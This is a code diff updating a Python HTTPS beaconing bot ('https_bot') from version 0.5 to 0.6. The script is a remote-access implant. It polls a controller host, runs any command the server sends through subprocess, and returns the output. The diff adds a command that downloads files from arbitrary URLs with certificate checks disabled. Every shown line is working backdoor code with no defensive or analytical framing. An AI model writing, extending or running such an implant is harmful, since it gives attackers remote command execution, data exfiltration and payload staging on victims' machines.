@@ -1,4 +1,4 @@
-#https_bot v0.5
+#https_bot v0.6
 import requests
 import logging
 import subprocess
@@ -10,7 +10,7 @@ def beacon(host, seconds, proxies):
   time.sleep(int(seconds))
   fetch, content = request(host, proxies)
   if str(fetch) == "<Response [200]>":
-    output = parse(content)
+    output = parse(content, proxies)
     send(host, output, proxies)
   
 def send(host, output, proxies):
@@ -33,13 +33,15 @@ def request_certs(host, pcert, key):
   response = requests.get('https://'+host, verify=False, cert=(pcert, key))
   return response
 
-def parse(response):
+def parse(response, proxies):
   commands = response.split()
   if commands[0] == "execute":
     ex = ' '.join(commands[1:])
     return execute(ex)
   if commands[0] == "sleep":
     return time.sleep(int(commands[1]))
+  if commands[0] == "download":
+    return download(commands[1], proxies)
   else: return 0
 
 def execute(command):
@@ -47,6 +49,18 @@ def execute(command):
   stdoutput = proc.stdout.read() + proc.stderr.read()
   return stdoutput
 
+def download(url, proxies):
+  local_filename = url.split('/')[-1]
+  if proxies is not None:
+    r = requests.get(url, stream=True, verify=False, proxies=proxies)
+  else:
+    r = requests.get(url, stream=True, verify=False)
+  with open(local_filename, 'wb') as f:
+    for chunk in r.iter_content(chunk_size=1024): 
+      if chunk:
+        f.write(chunk)
+        f.flush()
+  return local_filename
 
 def main():
   # Setup the command line arguments.
